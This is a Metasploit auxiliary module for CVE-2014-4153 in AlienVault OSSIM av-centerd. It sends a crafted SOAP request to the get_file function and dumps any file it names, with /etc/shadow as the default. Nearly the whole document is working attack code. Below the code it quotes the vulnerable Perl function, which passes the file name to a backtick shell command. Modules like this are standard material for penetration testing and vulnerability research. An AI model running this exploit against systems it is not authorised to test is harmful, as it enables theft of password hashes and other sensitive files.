require 'msf/core'

class MetasploitModule < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        => 'Alienvault OSSIM av-centerd Util.pm get_file Information Disclosure',
			'Description' => %q{
				This module exploits an information disclosure vulnerability found within the get_file
				function in Util.pm. The vulnerability exists because of an unsanitized $r_file parameter
				that allows for the leaking of arbitrary file information.
			},
			'References'  =>
			[
				[ 'CVE', '2014-4153' ],
				[ 'ZDI', '14-207' ],
				[ 'URL', 'http://forums.alienvault.com/discussion/2806' ],
			],
			'Author'      => [ 'james fitts' ],
			'License'     => MSF_LICENSE,
			'DisclosureDate' => 'Jun 13 2014')

		register_options([
			Opt::RPORT(40007),
			OptBool.new('SSL',   [true, 'Use SSL', true]),
			OptString.new('FILE', [ false, 'This is the file to download', '/etc/shadow'])
		], self.class)
	
	end

	def run

		soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
		soap += "<soap:Envelope xmlns:soap=\"http:\/\/schemas.xmlsoap.org/soap/envelope/\"\r\n"
		soap += "xmlns:soapenc=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding/\" xmlns:xsd=\"http:\/\/www.w3.org\/2001\/XMLSchema\"\r\n"
		soap += "xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\"\r\n"
		soap += "soap:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\">\r\n"
		soap += "<soap:Body>\r\n"
		soap += "<get_file xmlns=\"AV\/CC\/Util\">\r\n"
		soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
		soap += "<c-gensym5 xsi:type=\"xsd:string\">423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</c-gensym5>\r\n"
		soap += "<c-gensym7 xsi:type=\"xsd:string\">#{datastore['RHOST']}</c-gensym7>\r\n"
		soap += "<c-gensym9 xsi:type=\"xsd:string\">#{Rex::Text.rand_text_alpha(4 + rand(4))}</c-gensym9>\r\n"
		soap += "<c-gensym11 xsi:type=\"xsd:string\">#{datastore['FILE']}</c-gensym11>\r\n"
		soap += "</get_file>\r\n"
		soap += "</soap:Body>\r\n"
		soap += "</soap:Envelope>\r\n"

		res = send_request_cgi(
			{
				'uri'	=>	'/av-centerd',
				'method'	=>	'POST',
				'ctype'		=>	'text/xml; charset=UTF-8',
				'data'		=>	soap,
				'headers'	=>	{
					'SOAPAction'	=>	"\"AV/CC/Util#get_file\""
				}
			}, 20)

		if res && res.code == 200
			print_good("Dumping contents of #{datastore['FILE']} now...")
			data = res.body.scan(/(?<=xsi:type="soapenc:Array"><item xsi:type="xsd:string">)[\S\s]+<\/item><item xsi:type="xsd:string">/)
			puts data[0].split("<")[0]
		else
			print_bad("Something went wrong...")
		end

	end

end
__END__

/usr/share/alienvault-center/lib/AV/CC/Util.pm

sub get_file {
    my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname, $r_file )
        = @_;
    my $file_content;

    verbose_log_file(
        "GET FILE      : Received call from $uuid : ip source = $admin_ip, hostname = $hostname :($funcion_llamada,$nombre,$r_file)"
    );

    if ($r_file =~  /[;`\$\<\>\|]/) {
        console_log_file("Not allowed r_file: $r_file in get_file\n");
        my @ret = ("Error");
        return \@ret;
    }

    if ( !-f "$r_file" ) {
        #my @ret = ("Error");
        verbose_log_file("Error file $r_file not found!");
        # Return empty file if not exists
        my @ret = ( "", "d41d8cd98f00b204e9800998ecf8427e", "$systemuuid" );
        return \@ret;
    }

    my $md5sum = `md5sum $r_file | awk {'print \$1'}` if ( -f "$r_file" );

    if ( open( my $ifh, $r_file ) ) {

        binmode($ifh);
        $file_content = do { local $/; <$ifh> };
        close($ifh);

        my @ret = ( "$file_content", "$md5sum", "$systemuuid" );
        return \@ret;

    }
    else {
        my @ret = ("Error");
        verbose_log_file("Error file $r_file not found!");
        return \@ret;

    }

}